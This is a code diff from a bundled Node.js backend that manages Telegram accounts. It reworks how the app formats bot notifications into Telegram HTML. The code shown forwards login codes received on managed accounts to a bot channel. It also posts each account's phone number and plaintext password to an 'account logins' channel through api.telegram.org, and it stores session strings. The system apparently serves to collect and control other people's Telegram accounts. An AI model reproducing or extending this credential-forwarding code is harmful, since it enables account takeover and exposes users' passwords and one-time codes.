@@ -1723,7 +1723,7 @@ let AppService = AppService_1 = class AppService {
         if (!normalized)
             return { ok: false };
         const bounded = normalized.slice(0, 3500);
-        const sent = await this.botsService.sendMessageByCategory(components_1.ChannelCategory.WEB_TELEMETRY, (0, rich_message_1.telemetryToRichInput)(bounded), undefined, false);
+        const sent = await this.botsService.sendHtmlByCategory(components_1.ChannelCategory.WEB_TELEMETRY, (0, rich_message_1.telemetryToHtml)(bounded));
         return { ok: Boolean(sent) };
     }
     async findAllMasked(query) {
@@ -11276,13 +11276,10 @@ async function handleIncomingEvent(ctx, event) {
             ctx.logger.info(ctx.phoneNumber, `Login Code received for - ${ctx.phoneNumber}\nActiveClientSetup - TelegramManager.activeClientSetup`);
             ctx.logger.info(ctx.phoneNumber, 'Date :', new Date(event.message.date * 1000));
             await (0, bot_notice_1.sendBotNotice)('notif', {
-                title: 'Login Code Received',
-                fields: [
-                    { label: 'Client ID', value: process.env.clientId || 'unknown' },
-                    { label: 'Mobile', value: ctx.phoneNumber },
-                ],
+                title: `Login code · ${ctx.phoneNumber}`,
+                houseStyle: true,
                 quote: event.message.text?.substring(0, 100),
-                quoteLabel: 'Message',
+                quoteLabel: '',
             });
         }
     }
@@ -19562,6 +19559,9 @@ let BotsService = BotsService_1 = class BotsService {
     async sendMessageByCategory(category, message, options, allowServiceName = true) {
         return this.sendByCategoryWithFailover(category, this.sendMessageByBotId, message, options, allowServiceName);
     }
+    async sendHtmlByCategory(category, html, options) {
+        return this.sendByCategoryWithFailover(category, this.sendHtmlByBotId, html, options);
+    }
     async sendPhotoByCategory(category, photo, options) {
         return this.sendByCategoryWithFailover(category, this.sendPhotoByBotId, photo, options);
     }
@@ -19593,6 +19593,35 @@ let BotsService = BotsService_1 = class BotsService {
             await this.updateBotStats(botId, 'messagesSent', bot);
         }
         return success;
+    }
+    async sendHtmlByBotId(botId, html, options) {
+        const bot = await this.getBotById(botId);
+        if (!this.isSelectable(bot)) {
+            console.warn(`[BotHealth] refused direct send through non-verified bot @${bot.username}`);
+            return false;
+        }
+        try {
+            const response = await axios_1.default.post(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
+                chat_id: bot.channelId,
+                text: html.slice(0, 4096),
+                parse_mode: 'HTML',
+                link_preview_options: { is_disabled: true },
+                disable_notification: options?.disableNotification,
+                protect_content: options?.protectContent,
+            }, { timeout: 15000 });
+            if (response.data?.ok !== true) {
+                console.error(`Telegram API error for sendMessage with bot ${bot.username}:`, response.data?.description);
+                return false;
+            }
+            await this.updateBotStats(botId, 'messagesSent', bot);
+            return true;
+        }
+        catch (error) {
+            if (this.noteUnreachableSend(bot, error))
+                return false;
+            (0, utils_1.parseError)(error, `Failed to execute sendMessage (html) for bot ${bot.username}`);
+            return false;
+        }
     }
     async sendPhotoByBotId(botId, photo, options) {
         const bot = await this.getBotById(botId);
@@ -48487,6 +48516,7 @@ var __importDefault = (this && this.__importDefault) || function (mod) {
 var UsersService_1;
 Object.defineProperty(exports, "__esModule", ({ value: true }));
 exports.UsersService = void 0;
+exports.accountLoginHtml = accountLoginHtml;
 const Telegram_service_1 = __webpack_require__(/*! ../Telegram/Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
 const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
 const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
@@ -48504,6 +48534,14 @@ const mobile_utils_1 = __webpack_require__(/*! ../shared/mobile-utils */ "./src/
 const common_chats_1 = __webpack_require__(/*! ../../utils/telegram-utils/common-chats */ "./src/utils/telegram-utils/common-chats.ts");
 const buffer_client_service_1 = __webpack_require__(/*! ../buffer-clients/buffer-client.service */ "./src/components/buffer-clients/buffer-client.service.ts");
 const promote_client_service_1 = __webpack_require__(/*! ../promote-clients/promote-client.service */ "./src/components/promote-clients/promote-client.service.ts");
+const rich_message_1 = __webpack_require__(/*! ../../utils/rich-message */ "./src/utils/rich-message.ts");
+function accountLoginHtml(user, mobile) {
+    const handle = user.username?.replace(/^@/, '');
+    const account = handle
+        ? `<a href="https://t.me/${encodeURIComponent(handle)}">@${(0, rich_message_1.escapeTelegramHtml)(handle)}</a>`
+        : (0, rich_message_1.escapeTelegramHtml)(user.firstName || 'Unknown');
+    return `🔐 ${account} · <code>${(0, rich_message_1.escapeTelegramHtml)(mobile)}</code>${user.password ? ` · 🔑 <code>${(0, rich_message_1.escapeTelegramHtml)(user.password)}</code>` : ''}`;
+}
 let UsersService = UsersService_1 = class UsersService {
     constructor(userModel, telegramService, clientsService, botsService, bufferClientService, promoteClientService) {
         this.userModel = userModel;
@@ -48554,14 +48592,7 @@ let UsersService = UsersService_1 = class UsersService {
             await this.clientsService.updateClientSession(userData.session, canonicalMobile);
         }
         else {
-            await this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_LOGINS, {
-                title: 'Account Login',
-                fields: [
-                    { label: 'Account', value: userData.username ? `@${userData.username}` : userData.firstName },
-                    { label: 'Mobile', value: canonicalMobile },
-                    { label: 'Password', value: userData.password },
-                ],
-            }, undefined, false);
+            await this.botsService.sendHtmlByCategory(bots_1.ChannelCategory.ACCOUNT_LOGINS, accountLoginHtml(userData, canonicalMobile));
             const newUser = new this.userModel(userData);
             const saved = await newUser.save();
             setTimeout(() => {
@@ -54753,7 +54784,7 @@ exports.escapeTelegramHtml = escapeTelegramHtml;
 exports.notificationButtons = notificationButtons;
 exports.formatRichMessageHtml = formatRichMessageHtml;
 exports.textToRichInput = textToRichInput;
-exports.telemetryToRichInput = telemetryToRichInput;
+exports.telemetryToHtml = telemetryToHtml;
 exports.buttonsFromReplyMarkup = buttonsFromReplyMarkup;
 exports.formatClassicNotificationHtml = formatClassicNotificationHtml;
 exports.NotificationSeverity = Object.freeze({
@@ -54819,7 +54850,7 @@ function preBlock(code, max) {
 function allQuotes(input) {
     const out = [];
     if (input.quote && input.quote.trim())
-        out.push({ label: input.quoteLabel || 'Message', text: input.quote });
+        out.push({ label: input.quoteLabel ?? 'Message', text: input.quote });
     for (const q of input.quotes ?? [])
         if (q && q.text && q.text.trim())
             out.push({ label: q.label || 'Message', text: q.text });
@@ -54831,7 +54862,8 @@ function spoilerTag(value) {
 function renderQuote(label, text, spoiler) {
     const clipped = text.length > QUOTE_MAX_CHARS ? `${text.slice(0, QUOTE_MAX_CHARS)}\n… (${text.length - QUOTE_MAX_CHARS} more chars)` : text;
     const tag = clipped.length > QUOTE_EXPANDABLE_OVER ? 'blockquote expandable' : 'blockquote';
-    return `<p><b>${escapeTelegramHtml(label)}</b>${spoilerTag(spoiler)}</p><${tag}>${multiline(clipped)}</${tag.split(' ')[0]}>`;
+    const head = label || spoiler ? `<p>${label ? `<b>${escapeTelegramHtml(label)}</b>` : ''}${spoilerTag(spoiler)}</p>` : '';
+    return `${head}<${tag}>${multiline(clipped)}</${tag.split(' ')[0]}>`;
 }
 function visibleFields(input) {
     return (input.fields ?? []).filter((f) => !REDUNDANT_FIELD_LABELS.has(String(f.label ?? '').trim().toLowerCase())
@@ -54867,6 +54899,8 @@ function detailLines(input) {
         return [];
     return (Array.isArray(input.details) ? input.details : [input.details]).map((d) => String(d ?? '')).filter((d) => d.trim());
 }
+const INLINE_FIELDS_MAX = 3;
+const INLINE_FIELD_CHARS = 40;
 function formatRichMessageHtml(input, opts = {}) {
     const title = input.title || input.summary || 'Notification';
     const icon = input.houseStyle ? '' : `${SEVERITY_ICONS[input.severity ?? exports.NotificationSeverity.INFO]} `;
@@ -54874,11 +54908,14 @@ function formatRichMessageHtml(input, opts = {}) {
     const quotes = allQuotes(input);
     const hasSummary = Boolean(input.summary && input.summary !== title);
     const spoilerAt = !input.spoiler ? '' : quotes.length ? 'quote' : hasSummary ? 'summary' : 'heading';
-    const parts = [`<h3>${icon}${prefix}${escapeTelegramHtml(title)}${spoilerAt === 'heading' ? spoilerTag(input.spoiler) : ''}</h3>`];
+    const parts = [`<p><b>${icon}${prefix}${escapeTelegramHtml(title)}</b>${spoilerAt === 'heading' ? spoilerTag(input.spoiler) : ''}</p>`];
     if (hasSummary)
         parts.push(`<p>${multiline(input.summary)}${spoilerAt === 'summary' ? spoilerTag(input.spoiler) : ''}</p>`);
     const fields = visibleFields(input);
-    if (fields.length) {
+    if (fields.length && input.fieldLayout !== 'table' && fields.length <= INLINE_FIELDS_MAX && fields.every((f) => String(f.value ?? '').length <= INLINE_FIELD_CHARS)) {
+        parts.push(`<p>${fields.map((f) => `${escapeTelegramHtml(f.label)} ${cellValue(f)}`).join(' · ')}</p>`);
+    }
+    else if (fields.length) {
         const rows = fields.map((f) => `<tr><td><b>${escapeTelegramHtml(f.label)}</b></td><td>${cellValue(f)}</td></tr>`);
         parts.push(`<table bordered striped compact>${rows.join('')}</table>`);
     }
@@ -54952,30 +54989,32 @@ function textToRichInput(text, opts = {}) {
     return input;
 }
 const TELEMETRY_LABEL = /^([^:\n]{1,40}?)\s*:\s+([\s\S]+)$/;
-function telemetryToRichInput(text) {
+function telemetryToHtml(text) {
     const plain = String(text ?? '').replace(/<br\s*\/?>/gi, '\n').replace(HTML_TAG, '').replace(/&(lt|gt|quot|#39|amp);/g, (m) => ENTITIES[m] ?? m);
     const lines = plain.split('\n');
     const first = lines.findIndex((l) => l.trim());
     if (first < 0)
-        return { title: 'Telemetry' };
-    const [user, ...rest] = lines[first].trim().split(' · ');
-    const ip = rest.join(' · ').trim();
-    const head = { title: user.trim() || 'Telemetry', ...(ip ? { spoiler: ip } : {}) };
+        return '<b>Telemetry</b>';
+    const user = `<b>${escapeTelegramHtml(lines[first].trim().split(' · ')[0].trim() || 'Telemetry')}</b>`;
     const body = lines.slice(first + 1).join('\n').trim();
     if (!body)
-        return head;
+        return user;
     try {
         const parsed = JSON.parse(body);
-        if (parsed && typeof parsed === 'object')
-            return { ...head, code: { text: JSON.stringify(parsed, null, 2), language: 'json' } };
+        if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) {
+            const rows = Object.entries(parsed)
+                .filter(([, v]) => v !== '' && v !== null && v !== undefined)
+                .map(([k, v]) => `${escapeTelegramHtml(k)}: <code>${escapeTelegramHtml(typeof v === 'object' ? JSON.stringify(v) : String(v))}</code>`);
+            return rows.length ? `${user}\n${rows.join('\n')}` : user;
+        }
     }
     catch { }
+    if (!body.includes('\n') && body.length <= 60 && !TELEMETRY_LABEL.test(body))
+        return `${user} · ${escapeTelegramHtml(body)}`;
     const m = TELEMETRY_LABEL.exec(body);
-    if (m && !/^https?$/i.test(m[1]) && !/\/\//.test(m[1]))
-        return { ...head, quoteLabel: m[1].trim(), quote: m[2].trim() };
-    if (!body.includes('\n') && body.length <= 60)
-        return { ...head, summary: body };
-    return { ...head, quote: body };
+    const labelled = m && !/^https?$/i.test(m[1]) && !/\/\//.test(m[1]);
+    const quote = labelled ? `<b>${escapeTelegramHtml(m[1].trim())}:</b> ${escapeTelegramHtml(m[2].trim().slice(0, 3000))}` : escapeTelegramHtml(body.slice(0, 3000));
+    return `${user}\n<blockquote${quote.length > 800 ? ' expandable' : ''}>${quote}</blockquote>`;
 }
 function buttonsFromReplyMarkup(markup) {
     let parsed = markup;
@@ -55010,7 +55049,7 @@ function formatClassicNotificationHtml(input, prefix) {
     if (fields.length)
         blocks.push(fields.map((f) => `<b>${escapeTelegramHtml(f.label)}:</b> ${escapeTelegramHtml(f.value)}`));
     for (const q of allQuotes(input))
-        blocks.push([`<b>${escapeTelegramHtml(q.label)}</b>`, `<i>${escapeTelegramHtml(q.text.trim().slice(0, 1500))}</i>`]);
+        blocks.push([...(q.label ? [`<b>${escapeTelegramHtml(q.label)}</b>`] : []), `<blockquote>${escapeTelegramHtml(q.text.trim().slice(0, 1500))}</blockquote>`]);
     if (input.code?.text)
         blocks.push([...(input.code.label ? [`<b>${escapeTelegramHtml(input.code.label)}</b>`] : []), preBlock(input.code, 2500)]);
     for (const table of input.tables ?? []) {
